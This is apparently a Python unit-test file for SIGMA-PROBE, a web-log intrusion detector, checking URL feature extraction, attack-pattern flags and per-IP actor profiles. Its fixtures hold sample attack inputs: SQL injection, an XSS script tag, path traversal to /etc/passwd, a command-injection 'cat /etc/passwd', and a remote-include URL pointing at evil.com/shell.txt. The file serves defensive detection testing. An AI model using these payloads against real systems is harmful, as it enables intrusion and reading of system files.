"""
Unit tests for SIGMA-PROBE Data Models
"""

import pytest
from datetime import datetime

from src.models.core import LogEvent, ActorProfile

class TestLogEvent:
    """Test cases for LogEvent model"""
    
    def test_entropy_calculation(self):
        """Test entropy calculation"""
        # High entropy URL (random characters)
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/admin/login.php?id=1' OR '1'='1&token=abc123def456",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        assert event.entropy is not None
        assert event.entropy > 4.0  # Should be high entropy
        
        # Low entropy URL (repetitive)
        event2 = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/index/index/index/index",
            method="GET",
            status_code=200
        )
        event2.calculate_features()
        
        assert event2.entropy is not None
        assert event2.entropy < event.entropy  # Should be lower entropy
    
    def test_url_features_calculation(self):
        """Test URL feature calculation"""
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/admin/users.php?id=1&page=2&sort=name",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        assert event.url_length == len("/admin/users.php?id=1&page=2&sort=name")
        assert event.path_depth == 2  # /admin/users.php
        assert event.query_params_count == 3  # id, page, sort
    
    def test_lfi_rfi_detection(self):
        """Test LFI/RFI pattern detection"""
        # LFI pattern
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/index.php?page=../../../etc/passwd",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        assert 'LFI_RFI' in event.heuristic_flags
        
        # RFI pattern
        event2 = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/include.php?file=http://evil.com/shell.txt",
            method="GET",
            status_code=200
        )
        event2.calculate_features()
        
        assert 'LFI_RFI' in event2.heuristic_flags
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/login.php?id=1' OR '1'='1'--",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        assert 'SQL_INJECTION' in event.heuristic_flags
    
    def test_xss_detection(self):
        """Test XSS pattern detection"""
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/search.php?q=<script>alert('xss')</script>",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        assert 'XSS' in event.heuristic_flags
    
    def test_command_injection_detection(self):
        """Test command injection pattern detection"""
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/exec.php?cmd=cat /etc/passwd",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        assert 'COMMAND_INJECTION' in event.heuristic_flags
    
    def test_suspicious_extension_detection(self):
        """Test suspicious file extension detection"""
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/upload.php?file=shell.php",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        assert 'SUSPICIOUS_EXTENSION' in event.heuristic_flags
    
    def test_high_entropy_detection(self):
        """Test high entropy detection"""
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/admin.php?id=1&token=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        if event.entropy and event.entropy > 4.5:
            assert 'HIGH_ENTROPY' in event.heuristic_flags
    
    def test_long_url_detection(self):
        """Test long URL detection"""
        long_url = "/" + "a" * 2000  # URL longer than 2000 chars
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url=long_url,
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        assert 'LONG_URL' in event.heuristic_flags
    
    def test_many_params_detection(self):
        """Test many parameters detection"""
        # Create URL with many parameters
        params = "&".join([f"param{i}=value{i}" for i in range(15)])
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url=f"/test.php?{params}",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        assert 'MANY_PARAMS' in event.heuristic_flags
    
    def test_suspicious_user_agent_detection(self):
        """Test suspicious user agent detection"""
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/test",
            method="GET",
            status_code=200,
            user_agent="python-requests/2.25.1"
        )
        event.calculate_features()
        
        assert 'SUSPICIOUS_USER_AGENT' in event.heuristic_flags
    
    def test_overall_suspicious_flag(self):
        """Test overall suspicious flag"""
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/admin/login.php?id=1' OR '1'='1",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        # Should be suspicious due to SQL injection
        assert event.is_suspicious == True

class TestActorProfile:
    """Test cases for ActorProfile model"""
    
    def test_actor_creation(self):
        """Test actor profile creation"""
        actor = ActorProfile(ip_address="192.168.1.100")
        
        assert actor.ip_address == "192.168.1.100"
        assert len(actor.events) == 0
        assert len(actor.tags) == 0
        assert len(actor.evidence_trail) == 0
    
    def test_event_addition(self):
        """Test adding events to actor"""
        actor = ActorProfile(ip_address="192.168.1.100")
        
        event = LogEvent(
            timestamp=datetime.now(),
            source_ip="192.168.1.100",
            url="/test",
            method="GET",
            status_code=200
        )
        event.calculate_features()
        
        actor.add_event(event)
        
        assert len(actor.events) == 1
        assert actor.total_requests == 1
        assert actor.unique_urls == 1
    
    def test_metrics_calculation(self):
        """Test metrics calculation"""
        actor = ActorProfile(ip_address="192.168.1.100")
        
        # Add multiple events
        for i in range(5):
            event = LogEvent(
                timestamp=datetime.now(),
                source_ip="192.168.1.100",
                url=f"/test{i}",
                method="GET",
                status_code=200
            )
            event.calculate_features()
            actor.add_event(event)
        
        assert actor.total_requests == 5
        assert actor.unique_urls == 5
        assert actor.url_diversity_ratio == 1.0  # All URLs are unique
    
    def test_tag_addition(self):
        """Test adding tags to actor"""
        actor = ActorProfile(ip_address="192.168.1.100")
        
        actor.add_tag("LFI_RFI", "test")
        actor.add_tag("AUTOMATED_SCAN", "test")
        
        assert "LFI_RFI" in actor.tags
        assert "AUTOMATED_SCAN" in actor.tags
        assert len(actor.evidence_trail) == 2
    
    def test_evidence_addition(self):
        """Test adding evidence to actor"""
        actor = ActorProfile(ip_address="192.168.1.100")
        
        actor.add_evidence("TestDetector", "test_type", "Test evidence", 0.8)
        
        assert len(actor.evidence_trail) == 1
        evidence = actor.evidence_trail[0]
        assert evidence['source'] == "TestDetector"
        assert evidence['type'] == "test_type"
        assert evidence['details'] == "Test evidence"
        assert evidence['confidence'] == 0.8
    
    def test_behavioral_vector(self):
        """Test behavioral vector generation"""
        actor = ActorProfile(ip_address="192.168.1.100")
        
        # Add events with different URLs
        urls = ["/admin", "/login", "/admin", "/test", "/admin"]
        for url in urls:
            event = LogEvent(
                timestamp=datetime.now(),
                source_ip="192.168.1.100",
                url=url,
                method="GET",
                status_code=200
            )
            actor.add_event(event)
        
        vector = actor.get_behavioral_vector()
        
        assert len(vector) == 50  # Fixed size vector
        assert sum(vector) > 0  # Should have some values
        assert abs(sum(vector) - 1.0) < 0.01  # Should be normalized
    
    def test_empty_behavioral_vector(self):
        """Test behavioral vector for actor with no events"""
        actor = ActorProfile(ip_address="192.168.1.100")
        
        vector = actor.get_behavioral_vector()
        
        assert len(vector) == 50
        assert sum(vector) == 0  # Should be all zeros 